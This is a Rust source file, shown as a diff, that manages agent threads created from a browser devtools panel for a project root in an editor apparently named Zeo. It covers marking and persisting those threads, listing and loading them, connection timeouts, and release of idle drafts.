+//! Devtools threads (story 055, design.md §B3): the threads a browser devtools panel creates for
+//! a project root, kept apart from the editor's threads.
+//!
+//! A thread is marked in memory when it is created ([`DevtoolsThreads`]), and the mark is written
+//! to `thread_organization.devtools_root` on its first metadata save carrying a `session_id`
+//! (D4): the organization store refuses drafts (GOTCHA G8), so an empty devtools thread leaves
+//! nothing behind and vanishes with Zeo's own draft cleanup after a restart (R5.3).
+//!
+//! Neither creating nor loading a devtools thread changes the thread the editor shows
+//! (Assumption A2): both go into the window's retained threads.
+//!
+//! Every line logged here is `devtools_threads event=<event>` followed by `key=value` fields, and
+//! names the root and the thread id; never a title, a message or an error's text (R9.2).
+
+use std::cell::RefCell;
+use std::cmp::Reverse;
+use std::fmt;
+use std::path::{Path, PathBuf};
+use std::rc::Rc;
+use std::time::{Duration, Instant};
+
+use anyhow::Result;
+use chrono::{DateTime, Utc};
+use collections::{HashMap, HashSet};
+use futures::channel::oneshot;
+use gpui::{
+    AnyWindowHandle, App, AppContext as _, Context, Entity, Global, Subscription, Task, WeakEntity,
+};
+use workspace::Workspace;
+
+use crate::agent_panel::CreateThreadOptions;
+use crate::browser_channel;
+use crate::browser_wire::{ChannelError, ThreadInfo, ThreadState};
+use crate::conversation_view::ConversationView;
+use crate::devtools_delivery::{DeliveryError, resolve_window_for_path, workspaces_by_recency};
+use crate::devtools_projects::{loggable_root, normalized};
+use crate::thread_metadata_store::{ThreadId, ThreadMetadata, ThreadMetadataStore};
+use crate::thread_organization::{self, ThreadOrganizationStore};
+use crate::{Agent, AgentPanel, AgentThreadSource};
+
+/// How long `created` (and a load) waits for the thread's agent connection (GOTCHA G7).
+pub const CONNECT_TIMEOUT: Duration = Duration::from_secs(30);
+
+/// The most threads [`list`] answers (R5.4).
+pub const LISTED_THREADS: usize = 50;
+
+/// The most idle-released drafts [`DevtoolsThreads`] remembers; past it the oldest is forgotten
+/// and answers `NotFound` like any other empty draft with no view.
+const REMEMBERED_RELEASES: usize = 64;
+
+/// Why a devtools thread could not be created or loaded. Every variant naming a root shows it,
+/// and [`DevtoolsThreadError::channel_error`] is the wire's answer for it.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub enum DevtoolsThreadError {
+    /// No window holds a worktree containing the root.
+    ProjectClosed { root: PathBuf },
+    /// The id names no devtools thread, or one that no longer exists.
+    NotFound { thread_id: String },
+    /// The thread exists but its agent did not become ready; `reason` is a fixed code.
+    AgentStartFailed { root: PathBuf, reason: &'static str },
+}
+
+impl DevtoolsThreadError {
+    pub fn channel_error(&self) -> ChannelError {
+        match self {
+            Self::ProjectClosed { .. } => ChannelError::ProjectClosed,
+            Self::NotFound { .. } => ChannelError::NotFound,
+            Self::AgentStartFailed { .. } => ChannelError::AgentStartFailed,
+        }
+    }
+
+    fn code(&self) -> &'static str {
+        match self {
+            Self::ProjectClosed { .. } => "project_closed",
+            Self::NotFound { .. } => "not_found",
+            Self::AgentStartFailed { reason, .. } => reason,
+        }
+    }
+}
+
+impl fmt::Display for DevtoolsThreadError {
+    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
+        match self {
+            Self::ProjectClosed { root } => write!(
+                formatter,
+                "devtools thread for {}: no Zeo window has this project open",
+                root.display()
+            ),
+            Self::NotFound { thread_id } => {
+                write!(formatter, "thread {thread_id} is not a devtools thread")
+            }
+            Self::AgentStartFailed { root, reason } => write!(
+                formatter,
+                "devtools thread for {}: the agent did not start ({reason})",
+                root.display()
+            ),
+        }
+    }
+}
+
+impl std::error::Error for DevtoolsThreadError {}
+
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum Promotion {
+    /// A draft: the mark lives in memory only.
+    Pending,
+    Persisted,
+    /// The store refused the mark; it stays in memory for this run and is not retried.
+    Refused,
+}
+
+struct Created {
+    root: PathBuf,
+    /// Creation order within this run, newest highest.
+    order: u64,
+    promotion: Promotion,
+}
+
+/// A devtools draft an agent panel released under its idle cap.
+struct Released {
+    /// Held weakly: a panel gone with its window must not be kept alive by this record.
+    panel: WeakEntity<AgentPanel>,
+    /// Release order within this run, newest highest.
+    order: u64,
+}
+
+/// The app-wide devtools marks: the threads created this run and a copy of the persisted ones.
+pub struct DevtoolsThreads {
+    created: HashMap<ThreadId, Created>,
+    next_order: u64,
+    /// `thread_organization.devtools_root`, re-read whenever that store changes, so that
+    /// [`DevtoolsThreads::is_devtools`] answers without a `cx`.
+    persisted: HashMap<ThreadId, PathBuf>,
+    /// When a create or a load last began waiting for each thread's connection, on the executor's
+    /// clock: the agent panel keeps a connecting devtools thread only within [`CONNECT_TIMEOUT`].
+    waiting_since: HashMap<ThreadId, Instant>,
+    /// The drafts an agent panel released under its idle cap (design.md §B3 v4). While the panel
+    /// that released one is still in an open window, [`ensure_loaded`] reloads it from its metadata
+    /// (R5.11); a draft whose window closed is forgotten and answers `NotFound` (R5.9), even once
+    /// its project reopens, because the reopened window has a new panel.
+    released: HashMap<ThreadId, Released>,
+    next_release: u64,
+    _subscriptions: Vec<Subscription>,
+}
+
+struct GlobalDevtoolsThreads(Entity<DevtoolsThreads>);
+
+impl Global for GlobalDevtoolsThreads {}
+
+impl DevtoolsThreads {
+    /// The registry, created on first use; creating it starts the promotion hook.
+    pub fn global(cx: &mut App) -> Entity<Self> {
+        if let Some(global) = cx.try_global::<GlobalDevtoolsThreads>() {
+            return global.0.clone();
+        }
+        let threads = cx.new(Self::new);
+        cx.set_global(GlobalDevtoolsThreads(threads.clone()));
+        threads
+    }
+
+    /// The registry, if anything has created it yet.
+    pub fn try_global(cx: &App) -> Option<Entity<Self>> {
+        cx.try_global::<GlobalDevtoolsThreads>()
+            .map(|global| global.0.clone())
+    }
+
+    fn new(cx: &mut Context<Self>) -> Self {
+        let mut subscriptions = Vec::new();
+        match ThreadMetadataStore::try_global(cx) {
+            Some(metadata) => subscriptions
+                .push(cx.observe(&metadata, |this, metadata, cx| this.promote(&metadata, cx))),
+            None => log::warn!(
+                "devtools_threads event=no_metadata_store: devtools marks will not be persisted"
+            ),
+        }
+        // `agent_ui::init` installs the organization store; a host that did not (045's browser
+        // channel fixtures) gets it here, as the mark has nowhere else to persist. Never replaced
+        // when it is already running.
+        if ThreadOrganizationStore::try_global(cx).is_none() {
+            thread_organization::init(cx);
+        }
+        let organization = ThreadOrganizationStore::global(cx);
+        subscriptions.push(cx.observe(&organization, |this, organization, cx| {
+            this.persisted = persisted_marks(organization.read(cx));
+            cx.notify();
+        }));
+        let this = cx.weak_entity();
+        subscriptions.push(cx.on_window_closed(move |cx, _| {
+            let this = this.clone();
+            // Once the close has settled, so no window is leased while the others are read.
+            cx.defer(move |cx| {
+                // A registry gone with the app has nothing left to forget.
+                this.update(cx, |threads, cx| threads.forget_closed_releases(cx))
+                    .ok();
+            });
+        }));
+        let persisted = persisted_marks(organization.read(cx));
+        Self {
+            created: HashMap::default(),
+            next_order: 0,
+            persisted,
+            waiting_since: HashMap::default(),
+            released: HashMap::default(),
+            next_release: 0,
+            _subscriptions: subscriptions,
+        }
+    }
+
+    /// The root `thread_id` is a devtools thread of, from memory or from the store; `None` for an
+    /// editor thread. What the thread list's badge reads (design.md §B8).
+    pub fn is_devtools(&self, thread_id: ThreadId) -> Option<PathBuf> {
+        self.created
+            .get(&thread_id)
+            .map(|created| created.root.clone())
+            .or_else(|| self.persisted.get(&thread_id).cloned())
+    }
+
+    fn mark(&mut self, thread_id: ThreadId, root: PathBuf, cx: &mut Context<Self>) {
+        self.start_waiting(thread_id, cx);
+        self.next_order += 1;
+        self.created.insert(
+            thread_id,
+            Created {
+                root,
+                order: self.next_order,
+                promotion: Promotion::Pending,
+            },
+        );
+        cx.notify();
+    }
+
+    fn start_waiting(&mut self, thread_id: ThreadId, cx: &Context<Self>) {
+        self.waiting_since
+            .insert(thread_id, cx.background_executor().now());
+    }
+
+    /// Remembers that `panel` released the devtools draft `thread_id` under its idle cap. Only an
+    /// unpromoted draft of this run is remembered: a thread with a conversation reloads anyway.
+    fn remember_released(&mut self, thread_id: ThreadId, panel: WeakEntity<AgentPanel>) {
+        let is_draft = self
+            .created
+            .get(&thread_id)
+            .is_some_and(|created| created.promotion == Promotion::Pending);
+        if !is_draft {
+            return;
+        }
+        // Not the window check here: the releasing panel is being updated, and its leased window
+        // would read as holding nothing.
+        self.released
+            .retain(|_, released| released.panel.upgrade().is_some());
+        self.next_release += 1;
+        self.released.insert(
+            thread_id,
+            Released {
+                panel,
+                order: self.next_release,
+            },
+        );
+        while self.released.len() > REMEMBERED_RELEASES {
+            let Some(oldest) = self
+                .released
+                .iter()
+                .min_by_key(|(_, released)| released.order)
+                .map(|(thread_id, _)| *thread_id)
+            else {
+                break;
+            };
+            self.released.remove(&oldest);
+        }
+    }
+
+    /// Whether `thread_id` is a draft an agent panel released under its idle cap, and that panel
+    /// is still in an open window (R5.11).
+    fn released_while_open(&self, thread_id: ThreadId, cx: &App) -> bool {
+        self.released
+            .get(&thread_id)
+            .is_some_and(|released| panel_in_open_window(&released.panel, cx))
+    }
+
+    /// Forgets every released draft whose panel is no longer in an open window: its project's
+    /// window closed, so the draft went with it (R5.9).
+    fn forget_closed_releases(&mut self, cx: &App) {
+        self.released
+            .retain(|_, released| panel_in_open_window(&released.panel, cx));
+    }
+
+    /// The promotion hook: a marked draft whose metadata now carries a session gets its mark
+    /// written, once (R5.2). Runs after the metadata store's update has ended, so the
+    /// organization store may read it.
+    fn promote(&mut self, metadata: &Entity<ThreadMetadataStore>, cx: &mut Context<Self>) {
+        let promoted: Vec<(ThreadId, PathBuf)> = self
+            .created
+            .iter()
+            .filter(|(_, created)| created.promotion == Promotion::Pending)
+            .filter(|(thread_id, _)| {
+                metadata
+                    .read(cx)
+                    .entry(**thread_id)
+                    .is_some_and(|entry| !entry.is_draft())
+            })
+            .map(|(thread_id, created)| (*thread_id, created.root.clone()))
+            .collect();
+        if promoted.is_empty() {
+            return;
+        }
+        let organization = ThreadOrganizationStore::try_global(cx);
+        for (thread_id, root) in promoted {
+            let written = match &organization {
+                Some(organization) => organization
+                    .update(cx, |store, cx| {
+                        store.set_devtools_root(thread_id, root.clone(), cx)
+                    })
+                    .map_err(|error| error.to_string()),
+                None => Err("the organization store is not running".to_string()),
+            };
+            let promotion = match written {
+                Ok(()) => {
+                    log_event(
+                        log::Level::Info,
+                        "mark_persisted",
+                        &root,
+                        format!("thread={}", thread_id.to_key_string()),
+                    );
+                    Promotion::Persisted
+                }
+                Err(error) => {
+                    // The error names ids only (`OrganizeError`'s `Display`).
+                    log_event(
+                        log::Level::Warn,
+                        "mark_not_persisted",
+                        &root,
+                        format!("thread={} reason={:?}", thread_id.to_key_string(), error),
+                    );
+                    Promotion::Refused
+                }
+            };
+            if let Some(created) = self.created.get_mut(&thread_id) {
+                created.promotion = promotion;
+            }
+            self.released.remove(&thread_id);
+        }
+    }
+}
+
+/// Whether a create or a load of the devtools thread `thread_id` began less than
+/// [`CONNECT_TIMEOUT`] ago, so a browser devtools panel may still be waiting for its connection.
+/// The agent panel asks it before releasing a thread that is still connecting; read-only, it never
+/// builds the registry, which `create` and `ensure_loaded` do.
+pub fn awaits_connection(thread_id: ThreadId, cx: &App) -> bool {
+    let Some(threads) = DevtoolsThreads::try_global(cx) else {
+        return false;
+    };
+    let now = cx.background_executor().now();
+    threads
+        .read(cx)
+        .waiting_since
+        .get(&thread_id)
+        .is_some_and(|since| now.saturating_duration_since(*since) < CONNECT_TIMEOUT)
+}
+
+/// Called by the agent panel for each thread it released under its idle cap: a devtools draft
+/// among them stays loadable while `panel` is in an open window (R5.11). Read-only when nothing
+/// built the registry, as then no devtools thread exists.
+pub fn note_released(thread_id: ThreadId, panel: WeakEntity<AgentPanel>, cx: &mut App) {
+    if let Some(threads) = DevtoolsThreads::try_global(cx) {
+        threads.update(cx, |threads, _| threads.remember_released(thread_id, panel));
+    }
+}
+
+/// Whether `panel` is alive and the agent panel of a workspace in an open window.
+fn panel_in_open_window(panel: &WeakEntity<AgentPanel>, cx: &App) -> bool {
+    let Some(panel) = panel.upgrade() else {
+        return false;
+    };
+    workspaces_by_recency(cx)
+        .into_iter()
+        .flat_map(|(_, workspaces)| workspaces)
+        .any(|workspace| workspace.read(cx).panel::<AgentPanel>(cx).as_ref() == Some(&panel))
+}
+
+fn persisted_marks(organization: &ThreadOrganizationStore) -> HashMap<ThreadId, PathBuf> {
+    organization
+        .devtools_roots()
+        .map(|(thread_id, root)| (thread_id, normalized(root)))
+        .collect()
+}
+
+/// Creates an empty devtools thread for `root` in the window holding it, without changing the
+/// thread that window shows, and answers once the thread's agent connection is ready (R5.1,
+/// GOTCHA G7). After [`CONNECT_TIMEOUT`] it answers `AgentStartFailed`; the thread stays, marked.
+pub fn create(root: &Path, cx: &mut App) -> Task<Result<ThreadInfo>> {
+    let root = normalized(root);
+    let started = Instant::now();
+    let (thread_id, view) = match start_thread(&root, cx) {
+        Ok(created) => created,
+        Err(error) => {
+            log_event(
+                log::Level::Warn,
+                "create_failed",
+                &root,
+                format!("reason={}", error.code()),
+            );
+            return Task::ready(Err(error.into()));
+        }
+    };
+    DevtoolsThreads::global(cx).update(cx, |threads, cx| threads.mark(thread_id, root.clone(), cx));
+
+    let ready = when_ready(&view, &root, cx);
+    let view = view.downgrade();
+    cx.spawn(async move |cx| {
+        let info = ready
+            .await
+            .and_then(|()| cx.update(|cx| ready_info(&view, &root, cx)));
+        let key = thread_id.to_key_string();
+        let ms = started.elapsed().as_millis();
+        match &info {
+            Ok(_) => log_event(
+                log::Level::Info,
+                "thread_created",
+                &root,
+                format!("thread={key} ms={ms}"),
+            ),
+            Err(error) => log_event(
+                log::Level::Warn,
+                "create_failed",
+                &root,
+                format!("thread={key} reason={} ms={ms}", error.code()),
+            ),
+        }
+        info.map_err(anyhow::Error::from)
+    })
+}
+
+fn start_thread(
+    root: &Path,
+    cx: &mut App,
+) -> Result<(ThreadId, Entity<ConversationView>), DevtoolsThreadError> {
+    let (window, workspace, panel) = panel_for(root, cx)?;
+    let work_dirs = workspace.read(cx).project().read(cx).default_path_list(cx);
+    let (thread_id, view) = window
+        .update(cx, |_, window, cx| {
+            panel.update(cx, |panel, cx| {
+                let thread_id = panel.create_thread_with_options(
+                    CreateThreadOptions {
+                        work_dirs: Some(work_dirs),
+                        ..Default::default()
+                    },
+                    AgentThreadSource::Devtools,
+                    window,
+                    cx,
+                );
+                (thread_id, panel.retained_threads().get(&thread_id).cloned())
+            })
+        })
+        .map_err(|_| window_closed(root))?;
+    let view = view.ok_or_else(|| DevtoolsThreadError::AgentStartFailed {
+        root: root.to_path_buf(),
+        reason: "released",
+    })?;
+    Ok((thread_id, view))
+}
+
+/// The window holding `root`, the workspace in it, and that workspace's agent panel.
+fn panel_for(
+    root: &Path,
+    cx: &App,
+) -> Result<(AnyWindowHandle, Entity<Workspace>, Entity<AgentPanel>), DevtoolsThreadError> {
+    let failed = |reason| DevtoolsThreadError::AgentStartFailed {
+        root: root.to_path_buf(),
+        reason,
+    };
+    let (window, workspace) = resolve_window_for_path(root, cx).map_err(|error| match error {
+        DeliveryError::NoWindow { .. } => DevtoolsThreadError::ProjectClosed {
+            root: root.to_path_buf(),
+        },
+        DeliveryError::AiDisabled { .. } => failed("ai_disabled"),
+        DeliveryError::NoAgentPanel { .. } => failed("no_agent_panel"),
+    })?;
+    let panel = workspace
+        .read(cx)
+        .panel::<AgentPanel>(cx)
+        .ok_or_else(|| failed("no_agent_panel"))?;
+    Ok((window, workspace, panel))
+}
+
+/// The window resolved for `root` closed before it could be updated.
+fn window_closed(root: &Path) -> DevtoolsThreadError {
+    DevtoolsThreadError::ProjectClosed {
+        root: root.to_path_buf(),
+    }
+}
+
+/// Every devtools thread of `root`: the ones created this run, newest first, then the persisted
+/// ones from earlier runs, newest first; at most [`LISTED_THREADS`] (R5.4). Never an editor
+/// thread, another root's, an archived one, or one whose thread no longer exists — an empty draft
+/// gone with its window included, by the same [`is_gone`] that makes [`ensure_loaded`] answer
+/// `NotFound`, so every listed thread answers a subscribe (R5.9).
+pub fn list(root: &Path, cx: &App) -> Vec<ThreadInfo> {
+    let root = normalized(root);
+    let metadata = ThreadMetadataStore::try_global(cx);
+    let metadata = metadata.as_ref().map(|store| store.read(cx));
+    let entry = |thread_id: ThreadId| metadata.and_then(|store| store.entry(thread_id));
+
+    let mut created_this_run: Vec<(u64, ThreadId)> = DevtoolsThreads::try_global(cx)
+        .map(|threads| {
+            threads
+                .read(cx)
+                .created
+                .iter()
+                .filter(|(_, created)| created.root == root)
+                .map(|(thread_id, created)| (created.order, *thread_id))
+                .collect()
+        })
+        .unwrap_or_default();
+    created_this_run.sort_by_key(|(order, _)| Reverse(*order));
+    let created_ids: HashSet<ThreadId> = created_this_run.iter().map(|(_, id)| *id).collect();
+
+    let mut earlier_runs: Vec<(DateTime<Utc>, ThreadId)> = persisted_of(&root, cx)
+        .into_iter()
+        .filter(|thread_id| !created_ids.contains(thread_id))
+        .filter_map(|thread_id| {
+            let entry = entry(thread_id)?;
+            Some((entry.created_at.unwrap_or(entry.updated_at), thread_id))
+        })
+        .collect();
+    earlier_runs.sort_by_key(|(created_at, _)| Reverse(*created_at));
+
+    created_this_run
+        .into_iter()
+        .map(|(_, thread_id)| thread_id)
+        .chain(earlier_runs.into_iter().map(|(_, thread_id)| thread_id))
+        .filter_map(|thread_id| {
+            let entry = entry(thread_id);
+            if entry.is_some_and(|entry| entry.archived) {
+                return None;
+            }
+            let view = find_view(thread_id, cx);
+            if is_gone(thread_id, view.is_some(), cx) {
+                return None;
+            }
+            view.and_then(|view| browser_channel::thread_info_of(&view, cx))
+                .or_else(|| entry.map(|entry| stored_info(entry, &root)))
+        })
+        .take(LISTED_THREADS)
+        .collect()
+}
+
+/// Whether `thread_id` (wire form, [`ThreadId::to_key_string`]) is a devtools thread of `root`,
+/// in memory or in the store, and not archived. Roots compare component-wise, so `/p/app/` is
+/// `/p/app` (R5.5).
+pub fn is_devtools_of(thread_id: &str, root: &Path, cx: &App) -> bool {
+    find_marked(thread_id, cx).is_some_and(|(_, marked_root)| marked_root == normalized(root))
+}
+
+/// Makes sure the devtools thread `thread_id` is loaded in a window, loading a persisted one into
+/// its project's window in the background (R5.6, Assumption A2), and answers once its agent
+/// connection is ready, within [`CONNECT_TIMEOUT`]. An archived one answers `NotFound`, and so
+/// does an empty one no window holds any more (R5.9), unless its agent panel released it under
+/// the idle cap and is still open: that one is reloaded from its metadata (R5.11).
+pub fn ensure_loaded(thread_id: &str, cx: &mut App) -> Task<Result<()>> {
+    // After a restart nothing may have built the registry yet; the wait below must be recorded
+    // in it, or the agent panel would release the thread while it connects.
+    let threads = DevtoolsThreads::global(cx);
+    let not_found = || {
+        Task::ready(Err(DevtoolsThreadError::NotFound {
+            thread_id: thread_id.to_string(),
+        }
+        .into()))
+    };
+    let Some((id, root)) = find_marked(thread_id, cx) else {
+        return not_found();
+    };
+    let live_view = find_view(id, cx);
+    // Decided before the window lookup, so the answer is the same whether the project is closed,
+    // reopened without its agent panel, or reopened; and by the predicate `list` skips with.
+    if is_gone(id, live_view.is_some(), cx) {
+        log_event(
+            log::Level::Info,
+            "load_failed",
+            &root,
+            format!("thread={thread_id} reason=not_found"),
+        );
+        return not_found();
+    }
+    threads.update(cx, |threads, cx| threads.start_waiting(id, cx));
+    let started = Instant::now();
+    let view = match live_view {
+        Some(view) => Ok(view),
+        None => load_in_background(id, &root, cx),
+    };
+    let view = match view {
+        Ok(view) => view,
+        Err(error) => {
+            log_event(
+                log::Level::Warn,
+                "load_failed",
+                &root,
+                format!("thread={thread_id} reason={}", error.code()),
+            );
+            return Task::ready(Err(error.into()));
+        }
+    };
+    // Held again: if the idle cap releases it later, that release is remembered afresh.
+    threads.update(cx, |threads, _| threads.released.remove(&id));
+    let ready = when_ready(&view, &root, cx);
+    cx.spawn(async move |_| {
+        let ready = ready.await;
+        let key = id.to_key_string();
+        let ms = started.elapsed().as_millis();
+        match &ready {
+            Ok(()) => log_event(
+                log::Level::Debug,
+                "thread_loaded",
+                &root,
+                format!("thread={key} ms={ms}"),
+            ),
+            Err(error) => log_event(
+                log::Level::Warn,
+                "load_failed",
+                &root,
+                format!("thread={key} reason={} ms={ms}", error.code()),
+            ),
+        }
+        ready.map_err(anyhow::Error::from)
+    })
+}
+
+fn load_in_background(
+    thread_id: ThreadId,
+    root: &Path,
+    cx: &mut App,
+) -> Result<Entity<ConversationView>, DevtoolsThreadError> {
+    let metadata = ThreadMetadataStore::try_global(cx)
+        .and_then(|store| store.read(cx).entry(thread_id).cloned())
+        .ok_or_else(|| DevtoolsThreadError::NotFound {
+            thread_id: thread_id.to_key_string(),
+        })?;
+    let (window, _, panel) = panel_for(root, cx)?;
+    window
+        .update(cx, |_, window, cx| {
+            panel.update(cx, |panel, cx| {
+                panel.load_thread_in_background(
+                    Agent::from(metadata.agent_id.clone()),
+                    thread_id,
+                    Some(metadata.folder_paths().clone()),
+                    metadata.title.clone(),
+                    AgentThreadSource::Devtools,
+                    window,
+                    cx,
+                )
+            })
+        })
+        .map_err(|_| window_closed(root))
+}
+
+/// Whether the devtools thread `thread_id` is gone: an empty draft nothing holds any more, closed
+/// with its project before its first message, so there is nothing to load (R5.9). The one
+/// exception is a draft the idle cap released from a panel that is still open (R5.11): a window
+/// check alone would also bring back a draft gone with its window once the project reopens.
+/// `has_live_view` is read from the view, not from the release record, so a released draft being
+/// reloaded is not gone. Shared by [`list`] and [`ensure_loaded`] so they never disagree.
+fn is_gone(thread_id: ThreadId, has_live_view: bool, cx: &App) -> bool {
+    let released_while_open = DevtoolsThreads::try_global(cx)
+        .is_some_and(|threads| threads.read(cx).released_while_open(thread_id, cx));
+    !has_live_view && !has_conversation(thread_id, cx) && !released_while_open
+}
+
+/// Whether `thread_id` outlives its window: its devtools mark is persisted, or its metadata
+/// carries a session (its first message went out, even if persisting the mark was refused).
+fn has_conversation(thread_id: ThreadId, cx: &App) -> bool {
+    let mark_persisted = ThreadOrganizationStore::try_global(cx).is_some_and(|organization| {
+        organization
+            .read(cx)
+            .devtools_roots()
+            .any(|(id, _)| id == thread_id)
+    });
+    let has_session = ThreadMetadataStore::try_global(cx).is_some_and(|store| {
+        store
+            .read(cx)
+            .entry(thread_id)
+            .is_some_and(|entry| !entry.is_draft())
+    });
+    mark_persisted || has_session
+}
+
+/// The marked thread whose wire id is `thread_id`, with its root. Exact string match: a thread
+/// is only ever named by the form [`ThreadId::to_key_string`] writes. An archived thread is not
+/// found, as [`list`] does not show it: answering it would load it without unarchiving it.
+fn find_marked(thread_id: &str, cx: &App) -> Option<(ThreadId, PathBuf)> {
+    let (id, root) = marked_in_memory(thread_id, cx).or_else(|| marked_in_store(thread_id, cx))?;
+    let archived = ThreadMetadataStore::try_global(cx)
+        .and_then(|store| store.read(cx).entry(id).map(|entry| entry.archived))
+        .unwrap_or(false);
+    (!archived).then_some((id, root))
+}
+
+fn marked_in_memory(thread_id: &str, cx: &App) -> Option<(ThreadId, PathBuf)> {
+    let threads = DevtoolsThreads::try_global(cx)?;
+    threads
+        .read(cx)
+        .created
+        .iter()
+        .find(|(id, _)| id.to_key_string() == thread_id)
+        .map(|(id, created)| (*id, created.root.clone()))
+}
+
+fn marked_in_store(thread_id: &str, cx: &App) -> Option<(ThreadId, PathBuf)> {
+    let organization = ThreadOrganizationStore::try_global(cx)?;
+    organization
+        .read(cx)
+        .devtools_roots()
+        .find(|(id, _)| id.to_key_string() == thread_id)
+        .map(|(id, root)| (id, normalized(root)))
+}
+
+/// The persisted devtools threads of `root`, read from the store itself: [`list`] has no `cx` to
+/// create the registry with.
+fn persisted_of(root: &Path, cx: &App) -> Vec<ThreadId> {
+    ThreadOrganizationStore::try_global(cx)
+        .map(|organization| {
+            organization
+                .read(cx)
+                .devtools_roots()
+                .filter(|(_, marked_root)| normalized(marked_root) == root)
+                .map(|(thread_id, _)| thread_id)
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+/// The view holding `thread_id` in any window's agent panel, loaded or still connecting, the
+/// panel's parked draft included.
+fn find_view(thread_id: ThreadId, cx: &App) -> Option<Entity<ConversationView>> {
+    workspaces_by_recency(cx)
+        .into_iter()
+        .flat_map(|(_, workspaces)| workspaces)
+        .filter_map(|workspace| workspace.read(cx).panel::<AgentPanel>(cx))
+        .find_map(|panel| panel.read(cx).conversation_view_for(thread_id, cx))
+}
+
+/// A thread no window holds, as its metadata describes it.
+fn stored_info(entry: &ThreadMetadata, root: &Path) -> ThreadInfo {
+    ThreadInfo {
+        thread_id: entry.thread_id.to_key_string(),
+        title: browser_channel::capped_title(&entry.display_title()),
+        project: root
+            .file_name()
+            .map(|name| name.to_string_lossy().into_owned())
+            .unwrap_or_else(|| root.display().to_string()),
+        agent: entry.agent_id.to_string(),
+        status: ThreadState::Idle,
+        followed: false,
+    }
+}
+
+fn ready_info(
+    view: &WeakEntity<ConversationView>,
+    root: &Path,
+    cx: &App,
+) -> Result<ThreadInfo, DevtoolsThreadError> {
+    view.upgrade()
+        .and_then(|view| browser_channel::thread_info_of(&view, cx))
+        .ok_or_else(|| DevtoolsThreadError::AgentStartFailed {
+            root: root.to_path_buf(),
+            reason: "released",
+        })
+}
+
+/// Whether `view`'s agent connection is ready (`Some(Ok)`), has failed (`Some(Err)` with a fixed
+/// code), or is still connecting (`None`).
+fn readiness(view: &ConversationView) -> Option<Result<(), &'static str>> {
+    if view.root_thread_view().is_some() {
+        Some(Ok(()))
+    } else if view.load_error().is_some() {
+        Some(Err("load_error"))
+    } else if view.as_connected().is_some() {
+        // Connected with no root session: the agent asked for authentication, which nobody at a
+        // browser panel can give.
+        Some(Err("auth_required"))
+    } else {
+        None
+    }
+}
+
+/// Resolves once `view` is ready, has failed, has been released, or [`CONNECT_TIMEOUT`] passed.
+/// The future holds `view` weakly: a view its panel dropped is not kept connecting.
+fn when_ready(
+    view: &Entity<ConversationView>,
+    root: &Path,
+    cx: &mut App,
+) -> impl Future<Output = Result<(), DevtoolsThreadError>> + use<> {
+    let failed = {
+        let root = root.to_path_buf();
+        move |reason| DevtoolsThreadError::AgentStartFailed { root, reason }
+    };
+    let (sender, receiver) = oneshot::channel::<Result<(), &'static str>>();
+    let sender = Rc::new(RefCell::new(Some(sender)));
+    let answer = {
+        let sender = sender.clone();
+        move |outcome| {
+            if let Some(sender) = sender.borrow_mut().take() {
+                // The receiver is gone only when the waiting task was dropped: nobody to tell.
+                sender.send(outcome).ok();
+            }
+        }
+    };
+
+    let mut subscriptions = Vec::new();
+    match readiness(view.read(cx)) {
+        Some(outcome) => answer(outcome),
+        None => {
+            subscriptions.push(cx.observe(view, {
+                let answer = answer.clone();
+                move |view, cx| {
+                    if let Some(outcome) = readiness(view.read(cx)) {
+                        answer(outcome);
+                    }
+                }
+            }));
+            subscriptions.push(cx.observe_release(view, move |_, _| answer(Err("released"))));
+        }
+    }
+
+    let timer = cx.background_executor().timer(CONNECT_TIMEOUT);
+    async move {
+        let _subscriptions = subscriptions;
+        let outcome =
+            smol::future::or(async { receiver.await.unwrap_or(Err("released")) }, async {
+                timer.await;
+                Err("timeout")
+            })
+            .await;
+        outcome.map_err(failed)
+    }
+}
+
+fn log_event(level: log::Level, event: &str, root: &Path, fields: String) {
+    browser_channel::log_line(
+        level,
+        format!(
+            "devtools_threads event={event} root={} {fields}",
+            loggable_root(root)
+        ),
+    );
+}
